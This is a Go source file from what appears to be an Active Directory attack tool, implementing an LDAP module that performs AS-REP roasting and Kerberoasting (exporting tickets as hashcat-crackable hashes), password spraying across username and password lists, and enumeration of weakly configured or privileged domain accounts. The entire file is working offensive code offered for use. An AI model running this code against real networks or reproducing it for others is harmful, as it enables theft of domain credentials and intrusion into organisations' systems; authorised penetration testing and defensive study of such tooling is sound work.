package runner

import (
	"fmt"
	"sync"

	"github.com/5amu/goad/pkg/kerberos"
	"github.com/5amu/goad/pkg/ldap"
	"github.com/5amu/goad/pkg/utils"
)

type LdapOptions struct {
	Targets struct {
		TARGETS []string `description:"Provide target IP/FQDN/FILE"`
	} `positional-args:"yes"`

	Connection struct {
		Username string `short:"u" description:"Provide username (or FILE)"`
		Password string `short:"p" description:"Provide password (or FILE)"`
		Domain   string `short:"d" long:"domain" description:"Provide domain"`
		Port     int    `long:"port" default:"389" description:"Ldap port to contact"`
		SSL      bool   `short:"s" long:"ssl" description:"Use ssl to interact with ldap"`
		UseTLS   bool   `long:"tls" description:"Upgrade the ldap connection"`
	} `group:"Connection Options" description:"Connection Options"`

	Hashes struct {
		AsrepRoast string `long:"asreproast" description:"Grab AS_REP ticket(s) parsed to be cracked with hashcat"`
		Kerberoast string `long:"kerberoast" description:"Grab TGS ticket(s) parsed to be cracked with hashcat"`
	} `group:"Hash Retrieval Options" description:"Hash Retrieval Options"`

	Enum struct {
		TrustedForDelegation bool `long:"trusted-for-delegation" description:"Get the list of users and computers with flag TRUSTED_FOR_DELEGATION"`
		PasswordNotRequired  bool `long:"password-not-required" description:"Get the list of users with flag PASSWD_NOTREQD"`
		PasswordNeverExpires bool `long:"password-never-expires" description:"Get the list of accounts with flag DONT_EXPIRE_PASSWD"`
		AdminCount           bool `long:"admin-count" description:"Get objets that had the value adminCount=1"`
		UsersEnum            bool `long:"users" description:"Enumerate enabled domain users"`
		GroupsEnum           bool `long:"groups" description:"Enumerate domain groups"`
		DCList               bool `long:"dc-list" description:"Enumerate Domain Controllers"`
		GetSID               bool `long:"get-sid" description:"Get domain sid"`
	} `group:"Enumeration Options" description:"Enumeration Options"`

	GMSA struct {
		GMSA           bool   `long:"gmsa" description:"Enumerate GMSA passwords"`
		GMSAConvertID  string `long:"gmsa-convert-id" description:"Get the secret name of specific gmsa or all gmsa if no gmsa provided"`
		GMSADecryptLSA string `long:"gmsa-decrypt-lsa" description:"Decrypt the gmsa encrypted value from LSA"`
	} `group:"Play with GMSA" description:"Play with GMSA"`

	BH struct {
		Bloodhound           string   `long:"bloodhound" description:"Run bloodhound collector (v4.2) and save in output file (zip)"`
		BloodhoundNameserver string   `short:"n" long:"nameserver" description:"Provide a nameserver for bloodhound collector"`
		Collection           []string `short:"c" long:"collection" default:"Default" description:"Which information to collect. Supported: Group, LocalAdmin, Session, Trusts, Default, DCOnly, DCOM, RDP, PSRemote, LoggedOn, Container, ObjectProps, ACL, All"`
	} `group:"Run Bloodhound Collector v4.2" description:"Run Bloodhound Collector v4.2"`

	targets   []string
	usernames []string
	passwords []string
}

func (o *LdapOptions) Run() (err error) {

	o.usernames, err = utils.ReadLines(o.Connection.Username)
	if err != nil {
		o.usernames = []string{o.Connection.Username}
	}
	o.passwords, err = utils.ReadLines(o.Connection.Password)
	if err != nil {
		o.passwords = []string{o.Connection.Password}
	}
	for _, t := range o.Targets.TARGETS {
		lines, err := utils.ReadLines(t)
		if err != nil {
			o.targets = append(o.targets, t)
		} else {
			o.targets = append(o.targets, lines...)
		}
	}

	var f func(string) error

	if o.Hashes.AsrepRoast != "" {
		f = o.asreproast
	} else if o.Hashes.Kerberoast != "" {
		f = o.kerberoast
	} else if o.Enum.TrustedForDelegation {
		f = o.trustedForDelegation
	} else if o.Enum.PasswordNotRequired {
		f = o.passwordNotRequired
	} else if o.Enum.UsersEnum {
		f = o.userenum
	} else if o.Enum.GroupsEnum {
		f = o.groupenum
	} else if o.Enum.PasswordNeverExpires {
		f = o.passwordNeverExpires
	} else if o.Enum.GetSID {
		f = o.domainSID
	} else if o.Enum.AdminCount {
		f = o.adminCount
	} else {
		return fmt.Errorf("nothing to do")
	}

	var wg sync.WaitGroup
	for _, target := range o.targets {
		wg.Add(1)
		go func(t string) {
			if err := f(t); err != nil {
				fmt.Println(err)
			}
			wg.Done()
		}(target)
	}
	wg.Wait()
	return nil
}

func (o *LdapOptions) asreproast(target string) error {
	var res []string
	for _, user := range o.usernames {
		client, err := kerberos.NewKerberosClient(o.Connection.Domain, target)
		if err != nil {
			return err
		}
		asrep, err := client.GetAsReqTgt(user)
		if err == nil {
			hash := utils.ASREPToHashcat(*asrep.Ticket)
			fmt.Printf("[+] ASREP-Roastable user %s\\%s... happy cracking!\n\n%s\n\n", o.Connection.Domain, user, hash)
			res = append(res, hash)
		}
	}

	if len(res) == 0 {
		return fmt.Errorf("[%s] no asrep-roastable user found on target", target)
	}
	return utils.WriteLines(res, o.Hashes.AsrepRoast)
}

func (o *LdapOptions) kerberoast(target string) error {
	ldapClient := ldap.NewLdapClient(target, o.Connection.Port, o.Connection.Domain, o.Connection.SSL, !o.Connection.UseTLS)
	ldapFilter := ldap.JoinFilters(
		ldap.FilterIsUser,
		ldap.NegativeFilter(ldap.FilterDisabledUser),
		ldap.NewFilter(ldap.AttributeServicePrincipalName, "*"),
	)

	krb5client, err := kerberos.NewKerberosClient(o.Connection.Domain, target)
	if err != nil {
		return err
	}

	for _, user := range o.usernames {
		for _, password := range o.passwords {
			if err := ldapClient.Authenticate(user, password); err != nil {
				fmt.Printf("[%s\\%s:%s] %v\n", o.Connection.Domain, user, password, err)
				continue
			}
			defer ldapClient.Close()

			krb5client.AuthenticateWithPassword(user, password)
			return ldapClient.FindObjectsWithCallback(ldapFilter, func(users []map[string]string) error {
				var res []string
				for _, entry := range users {
					usr := entry[ldap.AttributeSAMAccountName]
					spn := entry[ldap.AttributeServicePrincipalName]
					tgs, err := krb5client.GetServiceTicket(usr, spn)
					if err != nil {
						return err
					}
					hash := utils.TGSToHashcat(tgs.Ticket, usr)
					res = append(res, hash)
					fmt.Printf("[+] kerberoasted user %s\\%s for SPN %s... happy cracking!\n\n%s\n\n", o.Connection.Domain, usr, spn, hash)
				}
				if len(res) == 0 {
					return fmt.Errorf("[%s] no kerberoastable user found on target", target)
				}
				return utils.WriteLines(res, o.Hashes.Kerberoast)
			}, ldap.AttributeSAMAccountName, ldap.AttributeServicePrincipalName)
		}
	}
	return nil
}

func (o *LdapOptions) trustedForDelegation(target string) error {
	ldapClient := ldap.NewLdapClient(target, o.Connection.Port, o.Connection.Domain, o.Connection.SSL, !o.Connection.UseTLS)
	ldapFilter := ldap.JoinFilters(
		ldap.FilterIsUser,
		ldap.NegativeFilter(ldap.FilterDisabledUser),
		ldap.FilterTrustedForDelegation,
	)

	for _, user := range o.usernames {
		for _, password := range o.passwords {
			if err := ldapClient.Authenticate(user, password); err != nil {
				fmt.Printf("[%s\\%s:%s] %v\n", o.Connection.Domain, user, password, err)
				continue
			}
			defer ldapClient.Close()

			return ldapClient.FindObjectsWithCallback(ldapFilter, func(users []map[string]string) error {
				if len(users) == 0 {
					return fmt.Errorf("[%s]-[%s\\%s:%s] no user with TRUSTED_FOR_DELEGATION", target, o.Connection.Domain, user, password)
				}

				for _, entry := range users {
					usr := entry[ldap.AttributeSAMAccountName]
					fmt.Printf("[%s]-[%s\\%s:%s] the user is trusted for delegation %s\\%s\n", target, o.Connection.Domain, user, password, o.Connection.Domain, usr)
				}
				return nil
			}, ldap.AttributeSAMAccountName)
		}
	}
	return nil
}

func (o *LdapOptions) passwordNotRequired(target string) error {
	ldapClient := ldap.NewLdapClient(target, o.Connection.Port, o.Connection.Domain, o.Connection.SSL, !o.Connection.UseTLS)
	ldapFilter := ldap.JoinFilters(
		ldap.FilterIsUser,
		ldap.NegativeFilter(ldap.FilterDisabledUser),
		ldap.FilterPasswordNotRequired,
	)

	for _, user := range o.usernames {
		for _, password := range o.passwords {
			if err := ldapClient.Authenticate(user, password); err != nil {
				fmt.Printf("[%s\\%s:%s] %v\n", o.Connection.Domain, user, password, err)
				continue
			}
			defer ldapClient.Close()

			return ldapClient.FindObjectsWithCallback(ldapFilter, func(users []map[string]string) error {
				if len(users) == 0 {
					return fmt.Errorf("no user with PASSWD_NOTREQD")
				}
				for _, entry := range users {
					usr := entry[ldap.AttributeSAMAccountName]
					fmt.Printf("[%s]-[%s\\%s:%s] password not required for %s\\%s\n", target, o.Connection.Domain, user, password, o.Connection.Domain, usr)
				}
				return nil
			}, ldap.AttributeSAMAccountName)
		}
	}
	return nil
}

func (o *LdapOptions) passwordNeverExpires(target string) error {
	ldapClient := ldap.NewLdapClient(target, o.Connection.Port, o.Connection.Domain, o.Connection.SSL, !o.Connection.UseTLS)
	ldapFilter := ldap.JoinFilters(
		ldap.FilterIsUser,
		ldap.NegativeFilter(ldap.FilterDisabledUser),
		ldap.FilterDontExpirePassword,
	)

	for _, user := range o.usernames {
		for _, password := range o.passwords {
			if err := ldapClient.Authenticate(user, password); err != nil {
				fmt.Printf("[%s\\%s:%s] %v\n", o.Connection.Domain, user, password, err)
				continue
			}
			defer ldapClient.Close()

			return ldapClient.FindObjectsWithCallback(ldapFilter, func(users []map[string]string) error {
				if len(users) == 0 {
					return fmt.Errorf("impossible to enumerate users with a never expiring password")
				}
				for _, entry := range users {
					usr := entry[ldap.AttributeSAMAccountName]
					fmt.Printf("[%s]-[%s\\%s\\%s] %s\\%s has a never expiring password\n", o.Connection.Domain, target, user, password, o.Connection.Domain, usr)
				}
				return nil
			}, ldap.AttributeSAMAccountName)
		}
	}
	return nil
}

func (o *LdapOptions) adminCount(target string) error {
	ldapClient := ldap.NewLdapClient(target, o.Connection.Port, o.Connection.Domain, o.Connection.SSL, !o.Connection.UseTLS)
	ldapFilter := ldap.JoinFilters(
		ldap.FilterIsUser,
		ldap.NegativeFilter(ldap.FilterDisabledUser),
		ldap.FilterIsAdmin,
	)

	for _, user := range o.usernames {
		for _, password := range o.passwords {
			if err := ldapClient.Authenticate(user, password); err != nil {
				fmt.Printf("[%s\\%s:%s] %v\n", o.Connection.Domain, user, password, err)
				continue
			}
			defer ldapClient.Close()

			return ldapClient.FindObjectsWithCallback(ldapFilter, func(users []map[string]string) error {
				if len(users) == 0 {
					return fmt.Errorf("no user with (adminCount=1)")
				}
				for _, entry := range users {
					usr := entry[ldap.AttributeSAMAccountName]
					fmt.Printf("[%s]-[%s\\%s\\%s] %s\\%s has (adminCount=1)\n", o.Connection.Domain, target, user, password, o.Connection.Domain, usr)
				}
				return nil
			}, ldap.AttributeSAMAccountName)
		}
	}
	return nil
}

func (o *LdapOptions) userenum(target string) error {
	ldapClient := ldap.NewLdapClient(target, o.Connection.Port, o.Connection.Domain, o.Connection.SSL, !o.Connection.UseTLS)

	for _, user := range o.usernames {
		for _, password := range o.passwords {
			if err := ldapClient.Authenticate(user, password); err != nil {
				fmt.Printf("[%s\\%s:%s] %v\n", o.Connection.Domain, user, password, err)
				continue
			}
			defer ldapClient.Close()

			return ldapClient.FindObjectsWithCallback(ldap.FilterIsUser, func(users []map[string]string) error {
				if len(users) == 0 {
					return fmt.Errorf("impossible to enumerate users")
				}
				for _, entry := range users {
					usr := entry[ldap.AttributeSAMAccountName]
					fmt.Printf("[%s]-[%s\\%s:%s] found user %s\\%s\n", target, o.Connection.Domain, user, password, o.Connection.Domain, usr)
				}
				return nil
			}, ldap.AttributeSAMAccountName)
		}
	}
	return nil
}

func (o *LdapOptions) groupenum(target string) error {
	ldapClient := ldap.NewLdapClient(target, o.Connection.Port, o.Connection.Domain, o.Connection.SSL, !o.Connection.UseTLS)

	for _, user := range o.usernames {
		for _, password := range o.passwords {
			if err := ldapClient.Authenticate(user, password); err != nil {
				fmt.Printf("[%s\\%s:%s] %v\n", o.Connection.Domain, user, password, err)
				continue
			}
			defer ldapClient.Close()

			return ldapClient.FindObjectsWithCallback(ldap.FilterIsGroup, func(users []map[string]string) error {
				if len(users) == 0 {
					return fmt.Errorf("impossible to enumerate groups")
				}
				for _, entry := range users {
					grp := entry[ldap.AttributeSAMAccountName]
					fmt.Printf("[%s]-[%s\\%s:%s] found group %s\\%s\n", target, o.Connection.Domain, user, password, o.Connection.Domain, grp)
				}
				return nil
			}, ldap.AttributeSAMAccountName)
		}
	}
	return nil
}

func (o *LdapOptions) domainSID(target string) error {
	ldapClient := ldap.NewLdapClient(target, o.Connection.Port, o.Connection.Domain, o.Connection.SSL, !o.Connection.UseTLS)

	for _, user := range o.usernames {
		for _, password := range o.passwords {
			if err := ldapClient.Authenticate(user, password); err != nil {
				fmt.Printf("[%s\\%s:%s] %v\n", o.Connection.Domain, user, password, err)
				continue
			}
			defer ldapClient.Close()

			sid, err := ldapClient.GetDomainSID()
			if err != nil {
				return err
			}
			fmt.Printf("[%s]-[%s\\%s:%s] domain SID is %v\n", target, o.Connection.Domain, user, password, sid)
			return nil
		}
	}
	return nil
}
